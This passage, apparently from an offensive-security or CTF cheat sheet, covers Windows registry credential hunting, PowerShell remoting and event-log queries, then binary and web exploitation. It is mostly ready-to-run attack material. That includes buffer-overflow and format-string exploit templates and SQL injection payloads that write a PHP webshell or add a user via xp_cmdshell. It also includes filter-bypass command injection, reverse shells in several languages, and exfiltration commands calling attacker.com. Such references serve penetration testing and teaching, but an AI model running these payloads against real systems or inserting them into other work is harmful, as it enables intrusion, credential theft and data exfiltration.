Get-ItemProperty -Path "HKLM:\SECURITY\Policy\Secrets" -ErrorAction SilentlyContinue
Get-ItemProperty -Path "HKLM:\SAM\SAM\Domains\Account\Users" | Select-Object PSChildName
```

[Unverified] Direct access to SAM hive requires `SYSTEM` privileges. Offline registry analysis may be required for credential extraction.

**Stored RDP Credentials**

```powershell
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Remote Desktop Connection Manager\Default.rdg"
Get-ChildItem -Path "HKCU:\Software\Microsoft\Internet Explorer\IntelliForms\Storage2" -Recurse
```

Browser autofill credentials:

```powershell
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\IntelliForms\Storage2"
```

**Autologon Credentials**

Systems configured for automatic logon store credentials in plaintext:

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object DefaultUserName, DefaultPassword, DefaultDomainName
```

**PowerShell Command History in Registry**

```powershell
Get-ItemProperty -Path "HKCU:\Software\Microsoft\PowerShell\1\PSReadline\ConsoleHost_history.txt"
Get-Content -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

**Run and RunOnce Keys (Persistence Indicators)**

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
```

Examine all users' Run keys:

```powershell
foreach($user in Get-ChildItem "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\ProfileList") {
    $path = $user.PSPath -replace "HKEY_LOCAL_MACHINE", "Registry::HKLM"
    Get-ItemProperty -Path "$path\Software\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue
}
```

**Shell Extension Hijacking Vectors**

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Classes\*\ShellEx\ContextMenuHandlers"
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2"
```

**AppInit DLLs (Code Injection Point)**

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" | Select-Object AppInit_DLLs, LoadAppInit_DLLs
```

If `LoadAppInit_DLLs` is 1 and `AppInit_DLLs` contains paths, those DLLs load into all processes using User32.dll.

**Service Configuration Analysis**

```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\*" | Select-Object PSChildName, ImagePath, Start, Type
```

Identify services with suspicious or world-writable binaries:

```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\*" | Where-Object {$_.ImagePath -like "*C:\Temp\*" -or $_.ImagePath -like "*%temp%\*"}
```

**Network Configuration and Credentials**

VPN and network settings:

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\RAS\Connections\*"
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Settings\ZoneMap"
```

Proxy configuration that might expose credentials:

```powershell
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" | Select-Object ProxyServer, ProxyEnable
```

**Scheduled Tasks Registry Entries**

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\*"
```

**Registry Parsing and Extraction (Offline)**

For systems where Registry access is restricted, extract hives offline:

```bash
# From Linux, using python-registry module
python3 -c "
from Registry import Registry
reg = Registry.Registry('/path/to/SYSTEM')
for subkey in reg.root.subkeys():
    print(subkey.name)
"
```

Or using RegRipper:

```bash
regrip.pl -r SYSTEM -p rip_plugin_name
```

**Registry Privilege Escalation Patterns**

Identify potentially exploitable registry configurations:

```powershell
# World-writable registry keys
Get-ItemProperty -Path "HKLM:\SOFTWARE\*" | Where-Object {$_ -match ".*\\.*"}

# Unquoted service paths
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\*" | Where-Object {$_.ImagePath -notlike "`"*"} | Select-Object PSChildName, ImagePath
```

## PowerShell Remoting Discovery

PowerShell Remoting enables execution of scripts and commands across networked systems and represents a critical attack surface for lateral movement and privilege escalation when poorly configured.

**PowerShell Remoting Service Status**

Verify Windows Remote Management (WinRM) enablement:

```powershell
Get-Service WinRM | Select-Object Status, StartType
Test-WSMan -ComputerName localhost
```

**PowerShell Session Configuration Enumeration**

List all available PowerShell session configurations:

```powershell
Get-PSSessionConfiguration
Get-PSSessionConfiguration | Select-Object Name, Permission, RunAsUser
```

Detailed configuration analysis:

```powershell
Get-PSSessionConfiguration -Name Microsoft.PowerShell | Select-Object *
Get-PSSessionConfiguration Microsoft.PowerShell | Format-List -Property *
```

**Session Configuration Security Descriptor Analysis**

Extract and decode security descriptors:

```powershell
$config = Get-PSSessionConfiguration -Name Microsoft.PowerShell
$descriptor = $config | Select-Object -ExpandProperty SecurityDescriptorSDDL
$descriptor
```

[Inference] SDDL format encoding requires manual decoding or conversion tools to identify permission assignments.

**Credential Delegation Analysis**

```powershell
Get-PSSessionConfiguration | Select-Object Name, RunAsUser, @{Name="DelegateToIdentity";Expression={$_.RunAsUser}}
```

Identify if PowerShell remoting delegates credentials or restricts user identity.

**PowerShell Execution Policy**

Check execution policy restrictions:

```powershell
Get-ExecutionPolicy -Scope CurrentUser
Get-ExecutionPolicy -Scope LocalMachine
Get-ExecutionPolicy -List
```

Execution policy scope hierarchy (highest to lowest):

1. Process
2. CurrentUser
3. LocalMachine
4. MachinePolicy / UserPolicy

**PSRemoting Trust Settings**

Identify trusted hosts for remote connections:

```powershell
Get-Item WSMan:\localhost\Client\TrustedHosts
```

If set to `*`, any host can connect. If specific hosts listed, credentials may be transmitted insecurely.

**PowerShell Remoting Protocol Versions**

```powershell
$PSVersionTable
Get-PSSession | Select-Object Version
```

Older PowerShell versions (2.0) lack security enhancements in later versions.

**Authentication Mechanism Detection**

```powershell
Get-WSManInstance winrm/config/service/auth
(Get-WSManInstance winrm/config).auth
```

Supported authentication types: Kerberos, Negotiate, Basic, Digest, CredSSP, Certificate.

**Remote Command Execution Discovery**

Enumerate accessible remote systems:

```powershell
# Test connectivity to target systems
Test-WSMan -ComputerName target_host1, target_host2

# List accessible sessions
Get-PSSession
Get-PSSession -ComputerName target_host
```

**PowerShell Remoting Connection Exploitation**

Establish remote session when credentials available:

```powershell
$credential = New-Object System.Management.Automation.PSCredential("domain\username", (ConvertTo-SecureString "password" -AsPlainText -Force))
$session = New-PSSession -ComputerName target_host -Credential $credential
Enter-PSSession $session
```

Execute commands without interactive session:

```powershell
$sb = {Get-Content C:\flag.txt; whoami}
Invoke-Command -ComputerName target_host -Credential $credential -ScriptBlock $sb
```

**PowerShell ConstrainedLanguage Mode Detection**

[Unverified] Constrained Language Mode restricts PowerShell capabilities. Enumerate restrictions:

```powershell
$ExecutionContext.SessionState.LanguageMode
```

Output values: FullLanguage, ConstrainedLanguage, RestrictedLanguage, NoLanguage.

If ConstrainedLanguage enabled, script execution capabilities are restricted, requiring bypass techniques.

**PowerShell Logging Configuration**

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
```

Identify if PowerShell logging is enabled, which may record executed commands and ScriptBlock contents.

**PowerShell Profile Analysis**

User and system PowerShell profiles execute automatically:

```powershell
$PROFILE
$PROFILE.AllUsersAllHosts
$PROFILE.AllUsersCurrentHost
$PROFILE.CurrentUserAllHosts
$PROFILE.CurrentUserCurrentHost
```

Display profile contents:

```powershell
Get-Content $PROFILE -ErrorAction SilentlyContinue
Get-Content $env:windir\System32\WindowsPowerShell\v1.0\profile.ps1 -ErrorAction SilentlyContinue
```

**PowerShell History Extraction**

```powershell
Get-Content -Path (Get-PSReadlineOption).HistorySavePath
Get-Content -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
```

## Windows Event Log Analysis

Windows Event Logs record system, security, and application events, providing forensic evidence of user activity, privilege escalation attempts, and lateral movement pathways.

**Event Log Architecture**

Primary event log channels:

- **System**: Operating system and hardware events, driver failures, startup/shutdown
- **Security**: Authentication, privilege usage, object access, policy changes
- **Application**: Software-specific events
- **Setup**: Windows installation and component updates
- **Forwarded Events**: Events from remote computers

Access via Event Viewer:

```powershell
eventvwr.msc
```

**PowerShell Event Log Query**

Query Security log for specific event IDs:

```powershell
Get-EventLog -LogName Security | Select-Object EventID, TimeGenerated, Message | Head -100
Get-WinEvent -LogName Security | Select-Object ID, TimeCreated, Message | Head -100
```

**Event ID Reference for Exploitation**

Critical security event IDs:

- **4624**: Successful logon (includes logon type: 2=Interactive, 3=Network, 10=RemoteInteractive)
- **4625**: Failed logon (credential guessing indicator)
- **4720**: User account created
- **4728**: User added to security-enabled global group
- **4732**: User added to security-enabled local group
- **4738**: User account modified
- **4768**: Kerberos TGT requested
- **4769**: Kerberos service ticket requested
- **4776**: NTLM authentication attempt
- **4799**: Security group enumeration detected
- **5140**: Network share accessed
- **5145**: Network share object checked for access permission

**Credential Compromise Detection**

Query for failed logons indicating credential stuffing:

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} -MaxEvents 1000 | Where-Object {$_.TimeCreated -gt (Get-Date).AddDays(-1)} | Select-Object TimeCreated, @{Name="Account";Expression={$_.Properties[5].Value}}, @{Name="Workstation";Expression={$_.Properties[13].Value}}
```

Successful logons from unusual sources:

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | Where-Object {$_.Properties[8].Value -like "*CORP*"} | Select-Object TimeCreated, @{Name="User";Expression={$_.Properties[5].Value}}, @{Name="LogonType";Expression={$_.Properties[8].Value}}
```

**Lateral Movement Indicators**

Network logons (Event ID 4624, LogonType 3):

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624; Data=3} | Select-Object TimeCreated, @{Name="User";Expression={$_.Properties[5].Value}}, @{Name="Computer";Expression={$_.Properties[11].Value}}
```

Remote Interactive logons (Event ID 4624, LogonType 10 - RDP):

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | Where-Object {$_.Properties[8].Value -eq 10} | Select-Object TimeCreated, @{Name="User";Expression={$_.Properties[5].Value}}
```

**Privilege Escalation Evidence**

Special Privileges Assigned event (Event ID 4672):

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4672} | Select-Object TimeCreated, @{Name="User";Expression={$_.Properties[1].Value}}, @{Name="Privileges";Expression={$_.Properties[2].Value}}
```

Token elevation type analysis:

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | Where-Object {$_.Properties[8].Value -in @(2,10,11)} | Select-Object TimeCreated, @{Name="ElevationType";Expression={$_.Properties[8].Value}}
```

**Administrative Action Logging**

Local group modification (Event ID 4732):

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4732} | Select-Object TimeCreated, @{Name="TargetUser";Expression={$_.Properties[0].Value}}, @{Name="MemberName";Expression={$_.Properties[2].Value}}
```

Sensitive privilege usage (Event ID 4673):

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4673} | Select-Object TimeCreated, @{Name="User";Expression={$_.Properties[1].Value}}, @{Name="Privilege";Expression={$_.Properties[3].Value}}
```

**Process Execution Logging**

Enable Process Creation Auditing (Event ID 4688):

```powershell
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
```

Query process creation events:

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} | Select-Object TimeCreated, @{Name="CommandLine";Expression={$_.Properties[8].Value}}, @{Name="User";Expression={$_.Properties[1].Value}}
```

High-risk process execution:

```powershell
$riskProcesses = @("powershell.exe", "cmd.exe", "cscript.exe", "wscript.exe", "msiexec.exe", "regsvcs.exe", "sc.exe", "net.exe")
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} | Where-Object {$riskProcesses -contains ($_.Properties[5].Value -split '\\')[-1]} | Select-Object TimeCreated, @{Name="Process";Expression={$_.Properties[5].Value}}, @{Name="CommandLine";Expression={$_.Properties[8].Value}}
```

**PowerShell Logging Analysis**

PowerShell Module Logging (Event ID 4103):

```powershell
Get-WinEvent -FilterHashtable @{LogName='Windows PowerShell'; ID=4103} | Select-Object TimeCreated, @{Name="HostName";Expression={$_.Properties[2].Value}}, @{Name="CommandPath";Expression={$_.Properties[4].Value}}
```

PowerShell ScriptBlock Logging (Event ID 4104):

```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object TimeCreated, @{Name="ScriptBlock";Expression={$_.Properties[2].Value}}
```

**Object Access and File System Events**

File share access (Event ID 5140):

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=5140} | Select-Object TimeCreated, @{Name="ObjectName";Expression={$_.Properties[3].Value}}, @{Name="AccessList";Expression={$_.Properties[4].Value}}
```

**Event Log Export and Analysis**

Export logs for external analysis:

```powershell
Get-EventLog -LogName Security -Newest 10000 | Export-Csv security_events.csv
Get-WinEvent -LogName Security -MaxEvents 10000 | Export-Csv security_events.csv
wevtutil export-log Security security.evtx
```

Offline analysis using Event Log Explorer or similar tools for timeline reconstruction.

**Event Log Tampering Detection**

Verify log integrity and identify clearing events (Event ID 1102):

```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=1102} | Select-Object TimeCreated, @{Name="User";Expression={$_.Properties[1].Value}}, @{Name="LogName";Expression={$_.Properties[0].Value}}
```

**Event Log Retention Policy**

```powershell
Get-EventLog -List | Select-Object Log, MaximumKilobytes, MinimumRetentionDays
```

Identify if log rotation is configured, indicating whether historical events are preserved.

---

# Remote Access via Exploitation

## Buffer Overflow Exploitation

### Stack-Based Buffer Overflows

**Basic Vulnerability Identification**

```bash
# Check for stack protection mechanisms
checksec --file=<binary>
readelf -l <binary> | grep GNU_STACK
rabin2 -I <binary>  # Radare2
```

**Protection Mechanisms Detection**

```bash
# NX (Non-Executable Stack)
readelf -l <binary> | grep -E 'GNU_STACK|RW '

# Stack Canaries
objdump -d <binary> | grep stack_chk_fail

# ASLR (Address Space Layout Randomization)
cat /proc/sys/kernel/randomize_va_space  # 0=off, 1=conservative, 2=full

# PIE (Position Independent Executable)
readelf -h <binary> | grep Type
checksec --file=<binary> | grep PIE

# RELRO (Relocation Read-Only)
readelf -l <binary> | grep GNU_RELRO
```

**Manual Fuzzing for Buffer Overflows**

```bash
# Pattern generation for offset calculation
msf-pattern_create -l 500
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500

# Pattern offset identification
msf-pattern_offset -q <value>
msf-pattern_offset -l 500 -q 0x41384141
```

**GDB Debugging for Exploitation**

```bash
# Basic debugging setup
gdb ./vulnerable_program
gdb -q ./vulnerable_program

# GDB with PEDA/GEF/pwndbg
gdb -q ./program
source /path/to/peda.py

# Run with input
r $(python -c 'print "A"*100')
r < <(python -c 'print "A"*100')

# Key GDB commands
info registers  # Register values
info frame  # Stack frame information
x/100x $esp  # Examine stack
x/20i $eip  # Disassemble at EIP
backtrace  # Call stack

# Finding offset to EIP/RIP
pattern create 500
r $(pattern create 500)
pattern offset $eip
```

**Return-to-libc Exploitation**

```bash
# Find system() address
gdb ./program
break main
r
p system
p exit

# Find "/bin/sh" string
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
grep -oba '/bin/sh' /lib/i386-linux-gnu/libc.so.6

# Get libc base address
ldd ./program
cat /proc/<PID>/maps | grep libc
```

**ROP (Return-Oriented Programming) Chains**

```bash
# Find ROP gadgets
ROPgadget --binary ./program
ropper --file ./program
ropper --file ./program --search "pop rdi"

# Specific gadget searches
ROPgadget --binary ./program --only "pop|ret"
ROPgadget --binary ./program --string "/bin/sh"

# One-shot ROP gadgets (one_gadget tool)
one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

**Shellcode Development**

```bash
# Generate shellcode
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f python -b '\x00\x0a\x0d'
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c -b '\x00'

# Test shellcode
msfvenom -p linux/x86/exec CMD=/bin/sh -f raw | ndisasm -u -

# Common bad characters to avoid
\x00  # Null byte
\x0a  # Line feed
\x0d  # Carriage return
\x20  # Space
```

**Exploit Template (Python pwntools)**

```python
from pwn import *

# Context
context.arch = 'amd64'
context.os = 'linux'

# Connection
p = process('./vulnerable')
# p = remote('target.com', 1337)

# Payload construction
offset = 112
ret_addr = p64(0xdeadbeef)
payload = b'A' * offset + ret_addr

# Send exploit
p.sendline(payload)
p.interactive()
```

**Heap Overflow Exploitation Basics**

```bash
# Heap analysis with GDB
gdb ./program
heap chunks  # With gef/peda
vis_heap_chunks  # Visualize heap

# malloc debugging
export MALLOC_CHECK_=3
export MALLOC_PERTURB_=1

# Heap exploitation techniques
# - Use-After-Free (UAF)
# - Double Free
# - Heap Spraying
# - tcache poisoning (glibc 2.26+)
# - fastbin dup
```

### Practical Buffer Overflow Steps

**Step 1: Crash the Application**

```bash
python -c 'print "A"*1000' | ./vulnerable
```

**Step 2: Find Offset**

```bash
# Generate unique pattern
msf-pattern_create -l 1000 > pattern.txt
gdb ./vulnerable
r < pattern.txt
# Note EIP value
msf-pattern_offset -q <EIP_value> -l 1000
```

**Step 3: Control EIP**

```bash
python -c 'print "A"*<offset> + "BBBB"' | ./vulnerable
# Verify EIP = 0x42424242
```

**Step 4: Find Space for Shellcode**

```bash
# Check stack space after EIP
python -c 'print "A"*<offset> + "BBBB" + "C"*400' | ./vulnerable
# Examine stack in GDB
```

**Step 5: Execute Shellcode**

```bash
# JMP ESP gadget technique
objdump -d ./vulnerable | grep 'jmp.*esp'
msf-nasm_shell
nasm > jmp esp
# Use address of JMP ESP instruction
```

## Format String Vulnerabilities

### Identification and Reconnaissance

**Basic Detection**

```bash
# Test inputs
%x %x %x %x
%p %p %p %p
%s %s %s %s
AAAA%p%p%p%p

# Remote testing
printf "AAAA%%x%%x%%x%%x\n" | nc target.com 9999
```

**Source Code Indicators**

```c
// Vulnerable patterns
printf(user_input);
sprintf(buffer, user_input);
fprintf(file, user_input);
snprintf(buffer, size, user_input);
syslog(priority, user_input);
```

### Information Disclosure

**Stack Reading**

```bash
# Direct parameter access
%<n>$x   # Read nth parameter as hex
%<n>$s   # Read nth parameter as string
%<n>$p   # Read nth parameter as pointer

# Example: Read 10th stack position
%10$x
%10$p
```

**Finding Format String Offset**

```bash
# Using unique identifier
AAAA%x.%x.%x.%x.%x.%x.%x.%x
# Look for 41414141 (AAAA in hex)

# Automated with script
for i in {1..20}; do echo "%$i\$x"; done
```

**Memory Leak Exploitation**

```bash
# Leak libc addresses
%<n>$s where <n> points to GOT entry
%3$s  # Read string at 3rd parameter

# Leak stack canary
%<n>$p where <n> is canary position
```

### Arbitrary Write Primitives

**Using %n Specifier**

```c
// %n writes number of bytes printed so far
printf("AAAA%n", &variable);  // Writes 4 to variable
```

**Write-What-Where Technique**

```bash
# Basic format
[address]%<value>x%<offset>$n

# Example: Write 0x08040404 to address 0xbffff7a0
python -c 'print "\xa0\xf7\xff\xbf" + "%134520796x" + "%4$n"'
```

**Partial Overwrites with %hn and %hhn**

```bash
# %hn writes 2 bytes (short)
# %hhn writes 1 byte (byte)

# Overwrite GOT entry
[addr][addr+2]%<value1>x%<offset>$hn%<value2>x%<offset+1>$hn
```

**Automated Format String Exploitation**

```python
from pwn import *

# FmtStr helper
def send_payload(payload):
    p = process('./vulnerable')
    p.sendline(payload)
    return p.recvall()

# Automatic exploitation
autofmt = FmtStr(send_payload)
offset = autofmt.offset

# Write to arbitrary address
payload = fmtstr_payload(offset, {target_addr: target_value})
```

### Format String Attack Patterns

**GOT Overwrite**

```bash
# 1. Find format string offset
AAAA%x%x%x%x%x%x  # Look for 41414141

# 2. Get target function GOT address
objdump -R ./binary | grep printf
readelf -r ./binary

# 3. Craft payload to overwrite GOT
python -c 'print "[GOT_addr]" + "%<calculated>x%<offset>$n"'
```

**Stack Canary Leak and Bypass**

```bash
# Leak canary value
%<canary_offset>$p

# Use leaked value in exploit
payload = b'A'*offset + leaked_canary + padding + ret_addr
```

**ASLR Bypass via Format String**

```bash
# Leak stack/libc addresses
%<offset>$p  # Stack pointer
%<offset>$s  # Dereference for libc address

# Calculate base addresses
libc_base = leaked_addr - function_offset
```

### Practical Format String Tools

**pwntools Format String Module**

```python
from pwn import *

context.binary = './vulnerable'

def exec_fmt(payload):
    p = process('./vulnerable')
    p.sendline(payload)
    return p.recvall()

# Automatic format string exploitation
fmt = FmtStr(exec_fmt)
offset = fmt.offset

# Write primitive
payload = fmtstr_payload(offset, {0x0804a020: 0x41414141})
```

**Manual Format String Script**

```python
#!/usr/bin/env python3
import struct

def p32(addr):
    return struct.pack("<I", addr)

target = 0x0804a024
value = 0xdeadbeef
offset = 4

# Split value into two shorts
low = value & 0xffff
high = (value >> 16) & 0xffff

payload = p32(target) + p32(target + 2)
payload += f"%{low - 8}x%{offset}$hn"
payload += f"%{high - low}x%{offset + 1}$hn"
```

## Injection Attacks

### SQL Injection

**Basic SQL Injection Testing**

```sql
-- Authentication bypass
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
admin'--
admin' #

-- Boolean-based detection
' AND 1=1 --
' AND 1=2 --

-- Time-based detection
' AND SLEEP(5) --
' OR IF(1=1, SLEEP(5), 0) --
'; WAITFOR DELAY '00:00:05' --  -- MSSQL
```

**Union-Based SQL Injection**

```sql
-- Determine column count
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --  -- Continue until error

-- Alternative column count detection
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --

-- Extract data
' UNION SELECT username,password FROM users --
' UNION SELECT NULL,table_name FROM information_schema.tables --
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users' --
```

**Error-Based SQL Injection**

```sql
-- MySQL
' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e)) --
' AND updatexml(null,concat(0x7e,(SELECT database()),0x7e),null) --

-- MSSQL
' AND 1=CONVERT(int,(SELECT @@version)) --

-- PostgreSQL
' AND CAST((SELECT version()) AS int) --
```

**Blind SQL Injection**

```sql
-- Boolean-based
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --
' AND ASCII(SUBSTRING((SELECT database()),1,1))=115 --

-- Time-based
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0) --
' OR IF((SELECT COUNT(*) FROM users)>1,SLEEP(5),0) --
```

**SQL Injection for Remote Code Execution**

```sql
-- MySQL
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' --
' UNION SELECT load_file('/etc/passwd') --

-- MSSQL (xp_cmdshell)
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
'; EXEC xp_cmdshell 'net user hacker password123 /add' --

-- PostgreSQL
'; CREATE TABLE cmd_exec(cmd_output text); --
'; COPY cmd_exec FROM PROGRAM 'id'; --
'; SELECT * FROM cmd_exec; --
```

**SQLMap Automation**

```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# With POST data
sqlmap -u "http://target.com/login" --data="username=admin&password=pass"

# Database enumeration
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database_name --tables
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --columns
sqlmap -u "http://target.com/page?id=1" -D database_name -T users -C username,password --dump

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# File read/write
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Tamper scripts for WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page?id=1" --tamper=between,randomcase

# Advanced options
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --threads=10
sqlmap -u "http://target.com/page?id=1" --batch --random-agent
```

**Manual SQL Injection Payloads**

```sql
-- MySQL version detection
' UNION SELECT @@version,NULL,NULL --
' AND 1=2 UNION SELECT @@version --

-- Current database
' UNION SELECT database(),NULL,NULL --

-- List databases
' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata --

-- List tables
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database() --

-- List columns
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' --

-- Extract data
' UNION SELECT username,password,email FROM users --

-- Dump in one query
' UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL,NULL FROM users --
```

### Command Injection

**Basic Command Injection Payloads**

```bash
# Command separators
;ls
|ls
||ls
&ls
&&ls
`ls`
$(ls)

# Newline injection
%0als
%0d%0als

# Command substitution
`whoami`
$(whoami)
```

**Bypass Filters and WAF**

```bash
# Space bypass
{cat,/etc/passwd}
cat</etc/passwd
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# Quote and escape variations
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
c${u}at /etc/passwd

# Wildcard usage
cat /etc/pass??
cat /etc/pass*
/bin/c?t /etc/passwd

# Hex encoding
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")

# Base64 encoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# Variable expansion
u=ca;t=t;$u$t /etc/passwd
```

**Reverse Shell via Command Injection**

```bash
# Bash TCP reverse shell
;bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
;bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'

# Netcat reverse shell
;nc -e /bin/bash <IP> <PORT>
;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f

# Python reverse shell
;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP reverse shell
;php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl reverse shell
;perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Blind Command Injection Detection**

```bash
# Time-based detection
;sleep 10
;ping -c 10 127.0.0.1
;timeout 10

# DNS exfiltration
;nslookup $(whoami).attacker.com
;dig $(hostname).attacker.com
;curl http://$(whoami).attacker.com

# HTTP exfiltration
;curl http://attacker.com/?data=$(whoami|base64)
;wget http://attacker.com/?data=$(cat /etc/passwd|base64)
```

**Command Injection Testing Methodology**

```bash
# 1. Identify injection point
param=value;whoami

# 2. Test separators
param=value;whoami
param=value|whoami
param=value||whoami

# 3. Bypass filtering
param=value;w'h'o'a'm'i
param=value;$(whoami)

# 4. Establish callback
param=value;curl http://attacker.com/$(whoami)

# 5. Full exploitation
param=value;bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
```

**Commix Tool (Automated Command Injection)**

```bash
# Basic scan
commix -u "http://target.com/page?param=value"

# POST parameter
commix -u "http://target.com/page" --data="param=value"

# Custom injection marker
commix -u "http://target.com/page?param=INJECT_HERE"

# OS shell
commix -u "http://target.com/page?param=value" --os-shell

# File access
commix -u "http://target.com/page?param=value" --file-read="/etc/passwd"
commix -u "http://target.com/page?param=value" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Specific technique
commix -u "http://target.com/page?param=value" --technique=t  # time-based
```

### LDAP Injection

**Basic LDAP Injection**

```ldap
# Authentication bypass
*
*)(&
*)(|(objectClass=*
admin)(&
admin*)(&(password=*)

# LDAP filter injection
(&(uid=*)(password=*))
(&(uid=admin)(password=*))
(|(uid=*)(uid=admin))
```

**LDAP Injection Patterns**

```ldap
# Wildcard usage
*
*)(uid=*)
*))%00

# Boolean logic
admin*)(&
admin)(&(password=*
admin)(|(password=*)(password=*

# Comment out rest of query
admin)%00
admin))%00
```

**LDAP Attribute Enumeration**

```ldap
# Extract attributes
*)(&(objectClass=*)(attribute=*
*)(&(objectClass=user)(userPassword=*

# Blind enumeration
admin*
admina*
adminb*
# Continue until match found
```

**LDAP Injection Tools**

```bash
# ldapsearch manual testing
ldapsearch -x -H ldap://target.com -D "uid=admin,ou=users,dc=target,dc=com" -w "password" -b "dc=target,dc=com" "(uid=*)"

# Burp Intruder payloads
*
*)(&
*)(|(objectClass=*
admin)(&
```

### XPath Injection

**Basic XPath Injection**

```xpath
# Authentication bypass
' or '1'='1
' or 1=1 or 'a'='a
' or ''='

# Node extraction
'] | //* | a['a'='a
'] | //user/* | a['a'='a
```

**XPath Enumeration**

```xpath
# Count nodes
' and count(/*)=1 and '1'='1
' and count(//*)>10 and '1'='1

# String extraction
